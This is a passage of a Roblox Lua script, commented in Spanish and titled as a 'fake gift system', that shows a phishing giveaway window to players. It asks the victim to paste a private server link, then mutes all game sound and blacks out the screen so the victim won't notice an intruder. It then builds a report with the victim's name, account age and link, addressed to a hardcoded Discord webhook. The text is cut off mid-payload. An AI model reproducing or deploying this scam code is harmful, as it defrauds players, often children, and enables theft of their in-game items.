-- [[ CacaoDev Fake Gift System V2 - Steal a Brainrot ]]
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")
local player = Players.LocalPlayer

-- 1. TU WEBHOOK (Aquí te llega el link que el pendejo pegue)
local TuWebhookSecret = "https://discord.com/api/webhooks/1488017742165573812/JAj3XSpot3xrAxRWtD9XcJb7cnDaFQb5Xs9O9ha0lSHtJ5eaovFs0GW47AhcCM6OePg6" 

-- 2. INTERFAZ DE REGALO (El Gancho)
local sg = Instance.new("ScreenGui", player.PlayerGui)
sg.Name = "CacaoDev_GiftSystem"
local frame = Instance.new("Frame", sg)
frame.Size = UDim2.new(0, 380, 0, 220)
frame.Position = UDim2.new(0.5, -190, 0.35, 0)
frame.BackgroundColor3 = Color3.fromRGB(30, 0, 0) -- Rojo oscuro tipo "Premium"
frame.BorderSizePixel = 2
frame.BorderColor3 = Color3.fromRGB(255, 215, 0) -- Dorado para que se vea real

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 50)
title.Text = "🎁 FREE BRAINROT GIVEAWAY 🎁"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.BackgroundTransparency = 1

local desc = Instance.new("TextLabel", frame)
desc.Size = UDim2.new(0.9, 0, 0, 40)
desc.Position = UDim2.new(0.05, 0, 0.25, 0)
desc.Text = "Paste your Private Server Link below to receive 1x [Meowl] for free!"
desc.TextColor3 = Color3.fromRGB(200, 200, 200)
desc.Font = Enum.Font.SourceSansItalic
desc.TextWrapped = true
desc.BackgroundTransparency = 1

local box = Instance.new("TextBox", frame)
box.Size = UDim2.new(0.85, 0, 0, 40)
box.Position = UDim2.new(0.075, 0, 0.5, 0)
box.PlaceholderText = "https://www.roblox.com/games/..."
box.Text = ""
box.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
box.TextColor3 = Color3.new(1, 1, 1)

local btn = Instance.new("TextButton", frame)
btn.Size = UDim2.new(0.7, 0, 0, 45)
btn.Position = UDim2.new(0.15, 0, 0.75, 0)
btn.Text = "RECEIVE ITEMS NOW"
btn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
btn.Font = Enum.Font.GothamBold
btn.TextColor3 = Color3.new(1, 1, 1)

-- 3. EL TRUCO (Mute, Blackout y Envío)
btn.MouseButton1Click:Connect(function()
    local ServerLink = box.Text
    if ServerLink:find("roblox.com") then
        
        -- MUTE TOTAL (Para que no oiga si entras)
        for _, sound in pairs(game:GetDescendants()) do
            if sound:IsA("Sound") then sound.Volume = 0 end
        end

        -- BLACKOUT TOTAL (Tapa la pantalla)
        frame:TweenSize(UDim2.new(1.5, 0, 1.5, 0), "Out", "Quart", 0.5)
        frame.Position = UDim2.new(-0.25, 0, -0.25, 0)
        box.Visible = false
        btn.Visible = false
        desc.Visible = false
        title.Position = UDim2.new(0.2, 0, 0.4, 0)
        title.Text = "WAITING FOR SERVER TO SYNC... \nDO NOT CLOSE ROBLOX."
        title.TextSize = 30

        -- ESCANEO DE BRAINROTS (Para saber si vale la pena)
        local infoVictima = "Sin datos"
        pcall(function()
            local folder = workspace.Tycoons[player.Name].PurchasedObjects
            infoVictima = "Items detectados en la base."
        end)

        -- MANDARTE EL LINK A TI (CacaoDev Webhook)
        local payload = {
            ["content"] = "@everyone 🎯 **¡VICTIMA CAYÓ EN EL REGALO!**",
            ["embeds"] = {{
                ["title"] = "CacaoDev • Fake Gift Report",
                ["color"] = 0xffd700,
                ["fields"] = {
                    {["name"] = "👤 Víctima", ["value"] = player.Name, ["inline"] = true},
                    {["name"] = "📅 Cuenta", ["value"] = player.AccountAge .. " días", ["inline"] = true},
                    {["name"] = "🔗 LINK DEL SERVER", ["value"] = ServerLink},
                    {
